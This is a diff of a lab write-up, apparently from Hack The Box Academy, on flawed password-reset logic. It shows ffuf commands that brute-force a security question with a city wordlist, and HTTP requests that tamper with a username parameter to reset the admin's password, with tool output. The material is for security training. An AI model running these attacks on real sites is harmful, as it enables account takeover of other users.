@@ -4,22 +4,20 @@
 
 ## Guessable Password Reset Questions
 
-Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions.Â During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom ones. Therefore, within the same web application, the security questions of all users will be the same, allowing attackers to abuse them.
+Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions. During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom ones. Therefore, within the same web application, the security questions of all users will be the same, allowing attackers to abuse them.
 
 Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. Often, the weak link in a question-based password reset functionality is the predictability of the answers. It is common to find questions like the following:
 
 - "`What is your mother's maiden name?`"
 - "`What city were you born in?`"
 
-While these questions seem tied to the individual user, they can often be obtained throughÂ `OSINT`Â or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.
+While these questions seem tied to the individual user, they can often be obtained through`OSINT` or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.
 
-For instance, assuming a web application uses a security question likeÂ `What city were you born in?`:
+For instance, assuming a web application uses a security question like`What city were you born in?`:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_1.png)
 
-![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_1.png)
-
-We canÂ attempt toÂ brute-force the answer to this question by using a proper wordlist.Â There are multiple lists containing large cities in the world. For instance,Â [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv)Â CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city a user was born in.
+We can attempt to brute-force the answer to this question by using a proper wordlist. There are multiple lists containing large cities in the world. For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city a user was born in.
 
 Since the CSV file contains the city name in the first field, we can create our wordlist containing only the city name on each line using the following command:
 
@@ -36,15 +34,13 @@ As we can see, this results in a total of 26,468 cities.
 
 To set up our brute-force attack, we first need to specify the user we want to target:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_2.png)
 
-![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_2.png)
-
-As an example, we will target the userÂ `admin`. After specifying the username, we must answer the user's security question. The corresponding request looks like this:
+As an example, we will target the user`admin`. After specifying the username, we must answer the user's security question. The corresponding request looks like this:
 
 ![image](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_3.png)
 
-We can set up the correspondingÂ `ffuf`Â command from this request to brute-force the answer. Keep in mind that we need to specify our session cookie to associate our request with the usernameÂ `admin`Â we specified in the previous step:
+We can set up the corresponding`ffuf` command from this request to brute-force the answer. Keep in mind that we need to specify our session cookie to associate our request with the username`admin` we specified in the previous step:
 
 ```shell-session
 smoothment@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
@@ -52,14 +48,12 @@ smoothment@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security
 <SNIP>
 
 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
-    * FUZZ: Houston
+ * FUZZ: Houston
 ```
 
 After obtaining the security response, we can reset the admin user's password and entirely take over the account:
 
-Â Â Â 
-
-![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_4.png)
+ ![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_4.png)
 
 We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:
 
@@ -77,13 +71,11 @@ smoothment@htb[/htb]$ wc -l german_cities.txt
 
 Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account.
 
-For instance, consider the following password reset flow, which isÂ similar to the one discussed above. First, we specify the username:
+For instance, consider the following password reset flow, which is similar to the one discussed above. First, we specify the username:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_5.png)
 
-![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_5.png)
-
-We will use our demo accountÂ `htb-stdnt`, which results in the following request:
+We will use our demo account`htb-stdnt`, which results in the following request:
 
 ```http
 POST /reset.php HTTP/1.1
@@ -97,11 +89,9 @@ username=htb-stdnt
 
 Afterward, we need to supply the response to the security question:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_6.png)
 
-![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_6.png)
-
-Supplying the security responseÂ `London`Â results in the following request:
+Supplying the security response`London` results in the following request:
 
 
 ```http
@@ -132,7 +122,7 @@ Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
 password=P@$$w0rd&username=htb-stdnt
 ```
 
-Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the admin user's password by manipulating theÂ `username`Â parameter of the password reset request:
+Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the admin user's password by manipulating the`username` parameter of the password reset request:
 
 
 ```http
@@ -193,31 +183,31 @@ We get this output:
 ```
 ffuf -w city_wordlist.txt -u http://94.237.50.242:40498/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=vaqmcll67v0s0aif4rtq0jiggq" -d "security_response=FUZZ" -fr "Incorrect response." -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : POST
- :: URL              : http://94.237.50.242:40498/security_question.php
- :: Wordlist         : FUZZ: /home/samsepiol/city_wordlist.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Header           : Cookie: PHPSESSID=vaqmcll67v0s0aif4rtq0jiggq
- :: Data             : security_response=FUZZ
+ :: Method : POST
+ :: URL : http://94.237.50.242:40498/security_question.php
+ :: Wordlist : FUZZ: /home/samsepiol/city_wordlist.txt
+ :: Header : Content-Type: application/x-www-form-urlencoded
+ :: Header : Cookie: PHPSESSID=vaqmcll67v0s0aif4rtq0jiggq
+ :: Data : security_response=FUZZ
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Regexp: Incorrect response.
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Regexp: Incorrect response.
 ________________________________________________
 
-Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 149ms]
+Manchester [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 149ms]
 ```
 
 Answer for first question is `Manchester`, we got `302` status code, which means we are now able to reset the password:
